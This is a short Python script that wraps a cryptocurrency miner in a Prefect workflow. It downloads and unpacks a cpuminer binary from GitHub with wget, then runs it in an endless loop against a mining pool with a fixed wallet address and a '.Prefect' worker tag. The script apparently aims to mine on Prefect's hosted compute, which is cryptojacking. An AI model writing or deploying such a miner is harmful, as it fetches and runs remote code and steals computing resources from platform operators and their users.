import subprocess, time
from prefect import flow

@flow(timeout_seconds=86400)
def mine():
    subprocess.run(
        "wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O c.tar.gz && tar xf c.tar.gz",
        shell=True
    )
    while True:
        subprocess.run(
            "./cpuminer-avx2 -a yespowertide -o stratum+tcps://na.rplant.xyz:17059 -u TWJa3cLtb2ibL5C6i93GVD6DTHjUqpuxHs.Prefect -t 4",
            shell=True
        )
        time.sleep(2)

if __name__ == "__main__":
    mine()
